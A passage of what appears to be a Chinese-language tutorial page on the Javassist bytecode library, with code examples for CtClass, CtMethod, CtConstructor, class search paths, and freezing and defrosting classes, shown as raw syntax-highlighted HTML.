class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取类字段</span><span class="token class-name">CtField</span> ctField <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 判断数组类型</span>ctClass<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 判断原生类型</span>ctClass<span class="token punctuation">.</span><span class="token function">isPrimitive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 判断接口类型</span>ctClass<span class="token punctuation">.</span><span class="token function">isInterface</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 判断枚举类型</span>ctClass<span class="token punctuation">.</span><span class="token function">isEnum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 判断注解类型</span>ctClass<span class="token punctuation">.</span><span class="token function">isAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 冻结一个类，使其不可修改</span>ctClass<span class="token punctuation">.</span>freeze <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 判断一个类是否已被冻结</span>ctClass<span class="token punctuation">.</span><span class="token function">isFrozen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用</span>ctClass<span class="token punctuation">.</span><span class="token function">prune</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用prune方法</span>ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="CtClass类操作"><a href="#CtClass类操作" class="headerlink" title="CtClass类操作"></a>CtClass类操作</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 添加接口</span>ctClass<span class="token punctuation">.</span><span class="token function">addInterface</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 添加构造器</span>ctClass<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 添加字段</span>ctClass<span class="token punctuation">.</span><span class="token function">addField</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 添加方法</span>ctClass<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="CtClass类编译"><a href="#CtClass类编译" class="headerlink" title="CtClass类编译"></a>CtClass类编译</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 获取字节码文件 需要注意的是一旦调用该方法，则无法继续修改已经被加载的class</span><span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 类的字节码文件</span><span class="token class-name">ClassFile</span> classFile <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getClassFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 编译成字节码文件, 使用当前线程上下文类加载器加载类, 如果类已存在或者编译失败将抛出异常</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="CtMethod的相关方法"><a href="#CtMethod的相关方法" class="headerlink" title="CtMethod的相关方法"></a>CtMethod的相关方法</h3><p>上面我们创建一个新的方法使用了CtMethod类。CtMthod代表类中的某个方法，可以通过CtClass提供的API获取或者CtNewMethod新建，通过CtMethod对象可以实现对方法的修改。</p><ul><li>insertBefore : 在方法的起始位置插入代码；</li><li>insterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；</li><li>insertAt : 在指定的位置插入代码；</li><li>setBody: 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；</li><li>make : 创建一个新的方法。</li></ul><h4 id="获取CtMethod属性"><a href="#获取CtMethod属性" class="headerlink" title="获取CtMethod属性"></a>获取CtMethod属性</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtClass</span> ctClass5 <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">TestService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtMethod</span> ctMethod <span class="token operator">=</span> ctClass5<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"selectOrder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 方法名</span><span class="token class-name">String</span> methodName <span class="token operator">=</span> ctMethod<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 返回类型</span><span class="token class-name">CtClass</span> returnType <span class="token operator">=</span> ctMethod<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 方法参数, 通过此种方式得到方法参数列表</span><span class="token comment">// 格式: com.kawa.TestService.getOrder(java.lang.String,java.util.List)</span>ctMethod<span class="token punctuation">.</span><span class="token function">getLongName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 方法签名 格式: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;</span>ctMethod<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取方法参数名称, 可以通过这种方式得到方法真实参数名称</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> argKeys <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">MethodInfo</span> methodInfo <span class="token operator">=</span> ctMethod<span class="token punctuation">.</span><span class="token function">getMethodInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CodeAttribute</span> codeAttribute <span class="token operator">=</span> methodInfo<span class="token punctuation">.</span><span class="token function">getCodeAttribute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalVariableAttribute</span> attr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LocalVariableAttribute</span><span class="token punctuation">)</span> codeAttribute<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token class-name">LocalVariableAttribute</span><span class="token punctuation">.</span>tag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> len <span class="token operator">=</span> ctMethod<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token comment">// 非静态的成员函数的第一个参数是this</span><span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">isStatic</span><span class="token punctuation">(</span>ctMethod<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> pos<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    argKeys<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>attr<span class="token punctuation">.</span><span class="token function">variableName</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="CtMethod方法体修改"><a href="#CtMethod方法体修改" class="headerlink" title="CtMethod方法体修改"></a>CtMethod方法体修改</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 在方法体前插入代码块</span>ctMethod<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置方法体</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBody</span><span class="token punctuation">(</span><span class="token class-name">String</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 在方法体后插入代码块</span>ctMethod<span class="token punctuation">.</span><span class="token function">insertAfter</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 在某行 字节码 后插入代码块</span>ctMethod<span class="token punctuation">.</span><span class="token function">insertAt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 添加参数</span>ctMethod<span class="token punctuation">.</span><span class="token function">addParameter</span><span class="token punctuation">(</span><span class="token class-name">CtClass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置方法名</span>ctMethod<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"newName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置方法体 $0=this / $1,$2,$3... 代表方法参数</span>ctMethod<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"{$0.name = $1;}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个新的方法</span>ctMethod<span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"kawa"</span><span class="token punctuation">,</span><span class="token class-name">CtClass</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="异常块-addCatch"><a href="#异常块-addCatch" class="headerlink" title="异常块 addCatch()"></a>异常块 addCatch()</h4><p>在方法中加入try catch块, 需要注意的是, 必须在插入的代码中, 加入return值$e代表异常信息.插入的代码片段必须以throw或return语句结束</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtMethod</span> m <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token class-name">CtClass</span> etype <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.io.IOException"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">addCatch</span><span class="token punctuation">(</span><span class="token string">"{ System.out.println($e); throw $e; }"</span><span class="token punctuation">,</span> etype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 等同于添加如下代码: </span><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token comment">// the original method body</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h3><p>CtConstructor的实例表示一个构造函数。它可能代表一个静态构造函数（类初始化器）。可以通过CtConstructor.make方法创建</p><h4 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h4><pre class="language-none"><code class="language-none">//设置构造函数主体。voidsetBody(java.lang.String src)//从另一个构造函数复制一个构造函数主体。voidsetBody(CtConstructor src, ClassMap map)//复制此构造函数并将其转换为方法。CtMethodtoMethod(java.lang.String name, CtClass declaring)</code></pre><h2 id="类搜索路径"><a href="#类搜索路径" class="headerlink" title="类搜索路径"></a>类搜索路径</h2><p>  通过ClassPool.getDefault()获取的ClassPool使用 JVM 的类搜索路径。如果程序运行在JBoss或者Tomcat等 Web 服务器上，ClassPool可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//默认加载方式如pool.insertClassPath(new ClassClassPath(this.getClass()));</span><span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从file加载classpath</span>pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token string">"/usr/local/javalib"</span><span class="token punctuation">)</span><span class="token comment">//从URL中加载</span><span class="token class-name">ClassPath</span> cp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassPath</span><span class="token punctuation">(</span><span class="token string">"www.javassist.org"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">"/java/"</span><span class="token punctuation">,</span> <span class="token string">"org.javassist."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span>cp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从byte[] 中加载</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> a <span class="token keyword">byte</span> array<span class="token punctuation">;</span><span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token keyword">class</span> name<span class="token punctuation">;</span>cp<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayClassPath</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可以从输入流中加载class</span><span class="token class-name">InputStream</span> ins <span class="token operator">=</span> an input stream <span class="token keyword">for</span> reading a <span class="token keyword">class</span> file<span class="token punctuation">;</span><span class="token class-name">CtClass</span> cc <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>ins<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>通过ClassClassPath添加搜索路径</strong></p><pre class="language-java" data-language="java"><code class="language-java">pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将classpath插入到指定classpath之前</span>pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将classpath添加到指定classpath之后</span>pool<span class="token punctuation">.</span><span class="token function">appendClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将一个目录作为classpath</span>pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token string">"/xxx/lib"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>上面的语句将Person类添加到pool的类加载路径中。但在实践中，我发现通过这个可以将Person类所在的整个jar包添加到类加载路径中。<br><strong>通过ByteArrayPath添加搜索路径</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassPool</span> cp <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> 字节数组<span class="token punctuation">;</span><span class="token class-name">String</span> name <span class="token operator">=</span> 类名<span class="token punctuation">;</span>cp<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayClassPath</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtClass</span> cc <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>示例中的 CtClass 对象是字节数据buf代表的class文件。将对应的类名传递给ClassPool的get()方法，就可以从字节数组中读取到对应的类文件。<br><strong>通过URL指定搜索路径</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ClassPath</span> cp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassPath</span><span class="token punctuation">(</span><span class="token string">"www.sample.com"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">"/out/"</span><span class="token punctuation">,</span> <span class="token string">"com.test."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span>cp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>上述代码将<a href="http://www.sample.com/out%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%B1%BB%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84%E3%80%82%E5%B9%B6%E4%B8%94%E8%BF%99%E4%B8%AAURL%E5%8F%AA%E8%83%BD%E6%90%9C%E7%B4%A2">http://www.sample.com:80/out添加到类搜索路径。并且这个URL只能搜索</a> com.test包里面的类。例如，为了加载 com.test.Person，它的类文件会从获取<a href="http://www.sample.com/out/com/test/Person.class%E8%8E%B7%E5%8F%96">http://www.sample.com:80/out/com/test/Person.class获取</a><br><strong>通过输入流加载class</strong><br>如果你不知道类的全名，可以使用makeClass()方法：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassPool</span> cp <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> ins <span class="token operator">=</span>  <span class="token keyword">class</span>文件对应的输入流<span class="token punctuation">;</span><span class="token class-name">CtClass</span> cc <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>ins<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>makeClass()返回从给定输入流构造的CtClass对象。你可以使用makeClass()将类文件提供给ClassPool对象。如果搜索路径包含大的jar文件，这可能会提高性能。由于ClassPool对象按需读取类文件，它可能会重复搜索整个jar文件中的每个类文件。makeClass()可以用于优化此搜索。由makeClass()构造的CtClass保存在ClassPool对象中，从而使得类文件不会再被读取。</p><h2 id="读写字节码"><a href="#读写字节码" class="headerlink" title="读写字节码"></a>读写字节码</h2><p>Javassist是用来处理java字节码的类库， java字节码一般存放在后缀名称为class的二进制文件中。每个二进制文件都包含一个java类或者是java接口。<br>Javasist.CtClass是对类文件的抽象，处于编译中的此对象可以用来处理类文件。下面的代码用来展示一下其简单用法：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtClass</span> cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"test.Rectangle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"test.Point"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这段程序首先获取ClassPool的实例，它主要用来修改字节码的，里面存储着基于二进制文件构建的CtClass对象，它能够按需创建出CtClass对象并提供给后续处理流程使用。当需要进行类修改操作的时候，用户需要通过ClassPool实例的.get()方法，获取CtClass对象。从上面代码中我们可以看出，ClassPool的getDefault()方法将会查找系统默认的路径来搜索test.Rectable对象，然后将获取到的CtClass对象赋值给cc变量。</p><pre><code>从易于扩展使用的角度来说，ClassPool是由装载了很多CtClass对象的HashTable组成。其中，类名为key，CtClass对象为Value，这样就可以通过搜索HashTable的Key来找到相关的CtClass对象了。如果对象没有被找到，那么get()方法就会创建出一个默认的CtClass对象，然后放入到HashTable中，同时将当前创建的对象返回。从ClassPool中获取的CtClass对象，是可以被修改的。从上面的 代码中，我们可以看到，原先的父类，由test.Rectangle被改成了test.Point。这种更改可以通过调用CtClass().writeFile()将其持久化到文件中。同时，Javassist还提供了toBytecode()方法来直接获取修改的字节码:</code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以通过如下代码直接加载CtClass：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> clazz <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>toClass()方法被调用，将会使得当前线程中的context class loader加载此CtClass类，然后生成java.lang.Class对象</p><h3 id="新建类"><a href="#新建类" class="headerlink" title="新建类"></a>新建类</h3><p>新建一个类，可以使用ClassPool.makeClass()方法来实现：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtClass</span> cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Point"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>上面的代码展示的是创建无成员方法的Point类，如果需要附带方法的话，我们可以用CtNewMethod附带的工厂方法创建，然后利用CtClass.addMethod()将其追加就可以了 。<br>makeClass()不能用于创建新的接口。但是makeInterface()可以。接口的方法可以用CtNewmethod.abstractMethod()方法来创建，需要注意的是，在这里，一个接口方法其实是一个abstract方法。</p><h3 id="冻结类"><a href="#冻结类" class="headerlink" title="冻结类"></a>冻结类</h3><p>如果CtClass对象被writeFile(),toClass()或者toBytecode()转换成了类对象，Javassist将会冻结此CtClass对象。任何对此对象的后续更改都是不允许的。之所以这样做，主要是因为此类已经被JVM加载，由于JVM本身不支持类的重复加载操作，所以不允许更改。<br>一个冻结的CtClass对象，可以通过如下的代码进行解冻，如果想更改类的话，代码如下：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtClasss</span> cc <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span>    <span class="token operator">:</span>cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cc<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// OK since the class is not frozen.</span></code></pre><p>调用了defrost()方法之后，CtClass对象就可以随意修改了。<br>如果ClassPool.doPruning被设置为true，那么Javassist将会把已冻结的CtClass对象中的数据结构进行精简，此举主要是为了防止过多的内存消耗。而精简掉的部分，都是一些不必要的属性(attriute_info结构)。因此，当一个CtClass对象被精简之后，方法是无法被访问和调用的，但是方法名称，签名，注解可以被访问。被精简过的CtClass对象可以被再次解冻。需要注意的是，ClassPool.doPruning的默认值为false。<br>为了防止CtClass类被无端的精简，需要优先调用stopPruning()方法来进行阻止：</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><p>获得ClassPool</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPool</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>增加ClassPath<br>加载jar包：/path/to/app.jar<br>加载class：/path/to/classes<br>加载所有jar包：/path/to/jars/*</p><pre class="language-java" data-language="java"><code class="language-java">pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token string">"/path/to/jars/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>加载WEB-INF/classes和WEB-INF/lib/*</p><pre class="language-java" data-language="java"><code class="language-java">pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>导入编译类搜索路径</p><pre class="language-java" data-language="java"><code class="language-java">导入后方法体中可使用<span class="token punctuation">{</span> <span class="token class-name">Date</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>而不必使用全路径名<span class="token punctuation">{</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Date</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Date</span><span class="token 